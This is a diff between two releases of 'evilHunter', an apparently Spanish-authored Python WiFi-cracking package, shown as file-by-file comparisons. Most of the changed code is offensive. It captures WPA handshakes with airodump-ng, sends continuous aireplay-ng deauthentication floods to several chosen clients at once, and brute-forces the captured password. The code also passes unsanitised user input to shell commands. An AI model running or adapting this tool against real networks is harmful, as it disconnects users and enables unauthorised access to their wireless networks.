# Comparing `tmp/evilHunter-0.1.9.40.tar.gz` & `tmp/evilHunter-0.1.9.45.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.9.40.tar", last modified: Wed Jun 21 09:16:15 2023, max compression
+gzip compressed data, was "evilHunter-0.1.9.45.tar", last modified: Thu Jun 22 20:35:10 2023, max compression
```

## Comparing `evilHunter-0.1.9.40.tar` & `evilHunter-0.1.9.45.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-21 09:16:15.860605 evilHunter-0.1.9.40/
--rw-r--r--   0 root         (0) root         (0)     2700 2023-06-21 09:16:15.860605 evilHunter-0.1.9.40/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)     2467 2023-06-20 11:55:29.000000 evilHunter-0.1.9.40/README.md
--rw-r--r--   0 root         (0) root         (0)     4239 2023-06-19 20:54:25.000000 evilHunter-0.1.9.40/evilCracker.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-21 09:16:15.860605 evilHunter-0.1.9.40/evilHunter.egg-info/
--rw-r--r--   0 root         (0) root         (0)     2700 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      216 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       14 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/requires.txt
--rw-r--r--   0 root         (0) root         (0)        6 2023-06-21 09:16:15.000000 evilHunter-0.1.9.40/evilHunter.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)    29066 2023-06-20 21:32:44.000000 evilHunter-0.1.9.40/evilHunter.py
--rw-r--r--   0 root         (0) root         (0)       38 2023-06-21 09:16:15.860605 evilHunter-0.1.9.40/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      558 2023-06-21 09:15:32.000000 evilHunter-0.1.9.40/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-22 20:35:10.220749 evilHunter-0.1.9.45/
+-rw-r--r--   0 root         (0) root         (0)     2653 2023-06-22 20:35:10.220749 evilHunter-0.1.9.45/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)     2420 2023-06-22 19:13:13.000000 evilHunter-0.1.9.45/README.md
+-rw-r--r--   0 root         (0) root         (0)     4212 2023-06-22 19:31:15.000000 evilHunter-0.1.9.45/evilCracker.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-22 20:35:10.220749 evilHunter-0.1.9.45/evilHunter.egg-info/
+-rw-r--r--   0 root         (0) root         (0)     2653 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      216 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       14 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 root         (0) root         (0)        6 2023-06-22 20:35:10.000000 evilHunter-0.1.9.45/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)    30757 2023-06-22 19:13:13.000000 evilHunter-0.1.9.45/evilHunter.py
+-rw-r--r--   0 root         (0) root         (0)       38 2023-06-22 20:35:10.220749 evilHunter-0.1.9.45/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      558 2023-06-22 19:13:13.000000 evilHunter-0.1.9.45/setup.py
```

### Comparing `evilHunter-0.1.9.40/PKG-INFO` & `evilHunter-0.1.9.45/PKG-INFO`

 * *Files 5% similar despite different names*

```diff
@@ -1,23 +1,22 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.9.40
+Version: 0.1.9.45
 Summary: Cracking WiFi(KCRACK)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
 
 NOVEDADES:
         
-        ¡Añadido ataque direccionado a cliente!
-        Reorganizado código...
-        Control de errores y reparación de bugs
+        ¡Ahora puedes atacar a mas de 1 cliente!
+        Optimización de código
 
 Argumentos:
      
         
         [♦] evilHunter [-w /path/to/wordlists] [-b 12 (passwd length)] [-t 400 (Nº of threads)]
         
             (-w / --wordlist)
@@ -43,15 +42,15 @@
 
 Git Hub:
 
     Command Lines:
     
         $ git clone https://github.com/an0mal1a/evilHunter
         $ cd evilHunter
-        $ chmod 744 evilTrust
+        $ chmod 744 evilHunter
         $ sudo python3 setup.py install
     
     ┌──(supervisor㉿kali-machine)-[~/Escritorio]
     └─$ evilHunter.py 
 
 # REQUERIMENTS:
```

### Comparing `evilHunter-0.1.9.40/README.md` & `evilHunter-0.1.9.45/evilHunter.egg-info/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,14 +1,22 @@
+Metadata-Version: 2.1
+Name: evilHunter
+Version: 0.1.9.45
+Summary: Cracking WiFi(KCRACK)
+Home-page: https://github.com/an0mal1a/evilHunter
+Author: an0mal1a
+Author-email: pablodiez024@proton.me
+Description-Content-Type: text/markdown
+
 # evilHunter
 
 NOVEDADES:
         
-        ¡Añadido ataque direccionado a cliente!
-        Reorganizado código...
-        Control de errores y reparación de bugs
+        ¡Ahora puedes atacar a mas de 1 cliente!
+        Optimización de código
 
 Argumentos:
      
         
         [♦] evilHunter [-w /path/to/wordlists] [-b 12 (passwd length)] [-t 400 (Nº of threads)]
         
             (-w / --wordlist)
@@ -34,15 +42,15 @@
 
 Git Hub:
 
     Command Lines:
     
         $ git clone https://github.com/an0mal1a/evilHunter
         $ cd evilHunter
-        $ chmod 744 evilTrust
+        $ chmod 744 evilHunter
         $ sudo python3 setup.py install
     
     ┌──(supervisor㉿kali-machine)-[~/Escritorio]
     └─$ evilHunter.py 
 
 # REQUERIMENTS:
```

### Comparing `evilHunter-0.1.9.40/evilCracker.py` & `evilHunter-0.1.9.45/evilCracker.py`

 * *Files 15% similar despite different names*

```diff
@@ -11,25 +11,22 @@
     import concurrent.futures
     import time
     from datetime import datetime
     import colorama
     from colorama import Fore
     from concurrent.futures import ThreadPoolExecutor
     from tqdm import tqdm
-    #from evilHunter import exiting
     colorama.init()
 except ModuleNotFoundError as e:
     print("[!] Faltan Modulos...\n", e)
 
 tries = 0
 tried = []
 password_found = threading.Event()
 
-# Generar una contraseña aleatoria
-
 
 def generate_password(length):
     global tries
     long = [8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     if length == "r":
         length = random.choice(long)
 
@@ -63,16 +60,18 @@
         output = command.communicate()[0]
 
         dec_pkts = re.search(r"Number of decrypted WPA  packets\s+(\d+)", output.decode())
         dec_pkts = int(dec_pkts.group(1))
 
         if dec_pkts > 0:
             time.sleep(3)
-            print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + "Contraseña encontrada: " + Fore.LIGHTYELLOW_EX + f"{password}\n")
-            print(Fore.GREEN + "\n\n\t[+] " + Fore.BLUE + "Decrypted packets: " + Fore.LIGHTYELLOW_EX + f"{dec_pkts}\n")
+            print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + "Contraseña encontrada: " +
+                  Fore.LIGHTYELLOW_EX + f"{password}\n")
+            print(Fore.GREEN + "\n\n\t[+] " + Fore.BLUE + "Decrypted packets: " +
+                  Fore.LIGHTYELLOW_EX + f"{dec_pkts}\n")
             found = True
             password_found.set()
 
 
 def startbrute(file, length, threads, network_to_attack):
     start_time = datetime.now()
     main(file, length, threads, network_to_attack)
@@ -116,9 +115,10 @@
         # Esperamos a todos los hilos detenidos
         concurrent.futures.wait(futures)
 
 
 if __name__ == "__main__":
     start = datetime.now()
     print()
-    main(file=input("Enter .cap file --> "), long=input("Enter long --> "), threads=500, network_to_attack=input("SSID Name -> "))
-    print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start)
+    main(file=input("Enter .cap file --> "), long=input("Enter long --> "), threads=500,
+         network_to_attack=input("SSID Name -> "))
+    print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start)
```

### Comparing `evilHunter-0.1.9.40/evilHunter.egg-info/PKG-INFO` & `evilHunter-0.1.9.45/README.md`

 * *Files 10% similar despite different names*

```diff
@@ -1,23 +1,13 @@
-Metadata-Version: 2.1
-Name: evilHunter
-Version: 0.1.9.40
-Summary: Cracking WiFi(KCRACK)
-Home-page: https://github.com/an0mal1a/evilHunter
-Author: an0mal1a
-Author-email: pablodiez024@proton.me
-Description-Content-Type: text/markdown
-
 # evilHunter
 
 NOVEDADES:
         
-        ¡Añadido ataque direccionado a cliente!
-        Reorganizado código...
-        Control de errores y reparación de bugs
+        ¡Ahora puedes atacar a mas de 1 cliente!
+        Optimización de código
 
 Argumentos:
      
         
         [♦] evilHunter [-w /path/to/wordlists] [-b 12 (passwd length)] [-t 400 (Nº of threads)]
         
             (-w / --wordlist)
@@ -43,15 +33,15 @@
 
 Git Hub:
 
     Command Lines:
     
         $ git clone https://github.com/an0mal1a/evilHunter
         $ cd evilHunter
-        $ chmod 744 evilTrust
+        $ chmod 744 evilHunter
         $ sudo python3 setup.py install
     
     ┌──(supervisor㉿kali-machine)-[~/Escritorio]
     └─$ evilHunter.py 
 
 # REQUERIMENTS:
```

### Comparing `evilHunter-0.1.9.40/evilHunter.py` & `evilHunter-0.1.9.45/evilHunter.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,9 +1,10 @@
 #!/bin/python3
 # SUBIR A PYPI
+
 try:
     # Importamos librerias
     print("\n[*] Starting...")
     print("\n\t[*] Comprobando librerias...")
     import string
     import re
     import colorama
@@ -22,15 +23,15 @@
 
 except ModuleNotFoundError as e:
     print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
     print("[!] Exiting...")
     exit(1)
 
 #
-# Falta atacar a los clientes, tenemos el cliente y la red bien filtrada
+# Añadir el ataque a más de 1 cliente ( select_client() )
 #
 
 
 def delete_files():
     # Borramos archivos innnecesarios
     os.system('find /home/EvilHunter_Data/captures -type f ! -name "*.cap" -delete > /dev/null')
     os.system('rm /home/EvilHunter_Data/espec/*')
@@ -427,20 +428,29 @@
             if itera not in obetives:
                 obetives.append(itera)
 
         info = "  ".join(obetives)
         n_d = 0
 
         if re.findall("-[0-9]+", info):
-            encription = re.findall("WPA[0-9]  [A-Z]+  +[A-Z]+", info)
-
+            encription = re.findall("WPA[0-9]+[ ]+[A-Z]+[ ]+[A-Z]+", info)
             if not encription:
+                encription = re.findall("WPA+[ ]+[A-Z]+[ ]+[A-Z]+", info)
+                if not encription:
+                    continue
+
+            try:
+                channel = info.split()[info.split().index("WPA2") - 2]
+            except ValueError:
+                channel = info.split()[info.split().index("WPA3") - 2]
+            except ValueError:
+                channel = info.split()[info.split().index("WPA") - 2]
+            except ValueError:
                 continue
 
-            channel = info.split()[info.split().index("WPA2") - 2]
             name = info.split()[info.split().index("WPA2") + 3]
             if re.findall("^(<length:*)", name):
                 name = f"N/D_{n_d}"
                 n_d += 1
 
             net_specs[name] = {"bssid": mac,
                                "encription_type": encription[0],
@@ -566,14 +576,15 @@
 
     # Juntamos para detener
     capture.join()
 
 
 def print_clients(net_clients, bssid):
     print(Fore.YELLOW + "\n\n[*] " + Fore.LIGHTBLUE_EX + "Listing clients of the network\n" + Fore.RESET)
+    print("\tPara atacar a más de 1 cliente, ¡Números seguidos por coma!:\n\n\t\t\t" + Fore.RED + " [E.j: 1,2]\n")
 
     # CLIENTES DE RED INFO:
     for net_num in net_clients['networks']:
         try:
             if net_clients['networks'][net_num][bssid]:
                 clients_of_net = net_clients['networks'][net_num][bssid]['clients']
                 break
@@ -581,48 +592,85 @@
             continue
 
     # Recorremos clientes de la red seleccionada
     for client_num in clients_of_net:
         client = clients_of_net[client_num]
         print("\t" + Fore.RED + f"{client_num} ---> " + Fore.WHITE + f"{client}\n")
 
-    select_client(clients_of_net)
+    return select_client(clients_of_net)
 
 
 def select_client(clients):
     # Escogemos un cliente
-    client = None
-    while not client:
-        num_client = int(input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Number of the client to attack (E.j '1'): "))
-
-        # Si no existe el numero de cliente, seguimos preguntando
-        if num_client not in clients:
-            print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "El cliente Nº{} no ha sido detectado..".format(num_client))
-            client = None
-
-        # Si existe rompemos bucle y seguimos...
-        elif num_client in clients:
-            print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Cliente encontrado!")
-            client = clients[num_client]
-            time.sleep(0.5)
+    clients_to_attack = []
+    clients_to_do_attack = None
+
+    while not clients_to_do_attack:
+        clients_to_do_attack = None
+        num_client = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Client or clients to attack (E.j '1'): ")
+        num_clients = num_client.replace(" ", "").split(",")
+
+        if len(num_clients) > 1:
+            for client in num_clients:
+                if clients_to_do_attack == 0:
+                    break
+                clients_to_do_attack = verify_clients(client, clients, clients_to_attack)
+
+            if clients_to_do_attack != 0:
+                break
+
+        else:
+            clients_to_do_attack = verify_clients(num_client, clients, clients_to_attack)
+            if clients_to_do_attack != 0:
+                break
+
     # Devolvemos cliente a atacar
-    return client
+    return clients_to_do_attack
+
+
+def verify_clients(client, clients, clients_to_attack):
+    try:
+        client = int(client)
+    except ValueError:
+        print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "Carácter invalido... ['{}']".format(client))
+        client = None
+
+    # Si no existe el numero de cliente, seguimos preguntando
+    if client not in clients:
+        print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "El cliente Nº{} no ha sido detectado..".format(client))
+        return 0
+
+    # Si existe rompemos bucle y seguimos...
+    elif client in clients:
+        print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Cliente encontrado! -->", client)
+        clients_to_attack.append(clients[client])
+        time.sleep(0.5)
+
+    return clients_to_attack
 
 
 def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_client):
     if not os.path.exists(f"/home/EvilHunter_Data/captures/{network_to_attack}/"):
         os.makedirs(f"/home/EvilHunter_Data/captures/{network_to_attack}/")
 
     hand = subprocess.Popen(["airodump-ng", "-w", f"/home/EvilHunter_Data/captures/{network_to_attack}/"
                              + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
+
     # Si tenemos cliente  para atacar:
     if attack_client is not None:
-        subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, "-c", attack_client, interface],
-                         stdout=subprocess.DEVNULL)
+        threads = []
+        for client in attack_client:
+            thread = threading.Thread(target=deauth_client, args=(bssid, client))
+            thread.start()
+            threads.append(thread)
+
+        # Esperar a que todos los hilos terminen
+        for thread in threads:
+            thread.join()
     # Si no al broadcast
     else:
         subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
                          stdout=subprocess.DEVNULL)
 
     done = False
     while True:
@@ -643,14 +691,18 @@
         print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...")
     else:
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
     crack_handshake(direc, args, file, network_to_attack)
 
 
+def deauth_client(bssid, client):
+    subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, '-c', client, interface], stdout=subprocess.DEVNULL)
+
+
 def find_wordlists(wordlists):
     found = os.system("find {} > /dev/null".format(wordlists))
     while found != 0:
         print(Fore.YELLOW + "[!] " + Fore.RED + "Diccionario no encontrado, introduzca la ruta completa...")
         wordlists = input(Fore.YELLOW + "\n\t[!>] " + Fore.WHITE)
         found = os.system("find {}  > /dev/null".format(wordlists))
```

### Comparing `evilHunter-0.1.9.40/setup.py` & `evilHunter-0.1.9.45/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("README.md", "r", encoding="utf-8") as fh:
     long_description = fh.read()
 
 setup(
     name="evilHunter",
-    version="0.1.9.40",
+    version="0.1.9.45",
     description="Cracking WiFi(KCRACK)",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="an0mal1a",
     url="https://github.com/an0mal1a/evilHunter",
     author_email="pablodiez024@proton.me",
     packages=["words"],
```

